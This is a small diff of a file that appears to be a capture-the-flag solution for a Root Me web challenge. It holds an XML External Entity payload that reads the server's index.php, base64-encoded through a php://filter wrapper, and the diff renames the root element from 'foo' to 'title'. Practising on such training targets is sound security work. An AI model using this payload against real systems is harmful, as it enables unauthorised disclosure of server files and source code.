@@ -3,8 +3,8 @@ layout: null
 ---
 
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE foo [  
-   <!ELEMENT foo ANY >
+<!DOCTYPE title [  
+   <!ELEMENT title ANY >
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://challenge01.root-me.org/web-serveur/ch29/index.php" >
 ]>
-<foo>&xxe;</foo>
+<title>&xxe;</title>
